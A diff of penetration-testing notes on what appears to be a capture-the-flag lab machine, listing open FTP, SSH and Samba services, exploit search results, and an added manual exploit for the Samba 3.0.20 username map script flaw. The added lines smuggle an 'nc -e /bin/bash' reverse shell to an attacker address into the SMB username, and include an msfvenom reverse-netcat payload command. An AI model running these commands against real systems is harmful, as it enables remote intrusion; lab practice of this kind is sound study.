@@ -1,9 +1,9 @@
 
 21/tcp  open  ftp         vsftpd 2.3.4
-|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+ |_ftp-anon: Anonymous FTP login allowed (FTP code 230)
 
-Searchsploit
-vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)    
+ Searchsploit
+ vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)    
 
 
 22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
@@ -11,20 +11,32 @@ vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)
 
 139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
 
- print$          Disk      Printer Drivers
+  print$          Disk      Printer Drivers
         tmp             Disk      oh noes!
         opt             Disk      
         IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
         ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))
 
 
-nothing of intrest on the tmp share
+ Searchsploit - Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)
+
+//Manual exploit
 
 
-Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)
+ username = "/=`nohup " + payload.encoded + "`"
+
+ sudo smbclient //10.10.10.3/tmp -U '"./"=`nohup "nc -e /bin/bash 10.10.14.2 8080"`' 
+
+ or
+
+ sudo smbclient //10.10.10.3/tmp
+
+ smb:> logon "/=`nohup nc -e /bin/bash 10.10.14.2 8080 `" 
 
 
-Manual 
+
+
+//Via Smbattack.py script
 
 msfvenom -p cmd/unix/reverse_netcat LHOST=10.0.0.0 LPORT=1234 -f python
 
